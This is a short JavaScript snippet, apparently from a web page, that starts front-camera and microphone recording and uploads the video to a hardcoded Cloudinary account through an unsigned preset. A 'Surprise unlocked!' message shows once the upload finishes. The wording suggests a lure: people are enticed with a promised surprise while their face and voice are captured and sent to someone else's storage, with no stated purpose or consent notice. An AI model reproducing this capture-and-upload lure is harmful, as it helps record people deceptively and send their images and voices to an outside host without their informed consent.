// === Cloudinary upload config - replace with your own values ===
const CLOUD_NAME = "dps0g5ftz";      // Your cloud name here
const UPLOAD_PRESET = "unsigned";     // Your unsigned preset here

let mediaRecorder;
let recordedChunks = [];

async function startRecording() {
  try {
    recordedChunks = [];  // Clear recorded chunks on each start

    const constraints = {
      audio: true,
      video: { facingMode: "user" } // front camera
    };
    const stream = await navigator.mediaDevices.getUserMedia(constraints);

    if (mediaRecorder && mediaRecorder.state !== "inactive") {
      mediaRecorder.stop(); // stop previous recorder if any
    }

    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

    mediaRecorder.ondataavailable = e => {
      if (e.data.size > 0) recordedChunks.push(e.data);
    };

    mediaRecorder.onstop = () => {
      const blob = new Blob(recordedChunks, { type: "video/webm" });
      recordedChunks = [];
      uploadVideo(blob);
      // Stop all tracks to release camera and mic
      stream.getTracks().forEach(track => track.stop());
    };

    mediaRecorder.start();
    console.log("Recording started.");
  } catch (err) {
    console.error("Media recording failed:", err);
  }
}

async function uploadVideo(blob) {
  const formData = new FormData();
  formData.append("file", blob);
  formData.append("upload_preset", UPLOAD_PRESET);

  try {
    const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
      method: "POST",
      body: formData
    });
    const data = await res.json();
    console.log("Video uploaded:", data.secure_url);
    alert("Surprise unlocked! Your video has been saved.");
  } catch (err) {
    console.error("Upload failed:", err);
    alert("Oops, upload failed.");
  }
}

function stopRecordingAndSave() {
  if (mediaRecorder && mediaRecorder.state === "recording") {
    mediaRecorder.stop();
    console.log("Recording stopped.");
  }
}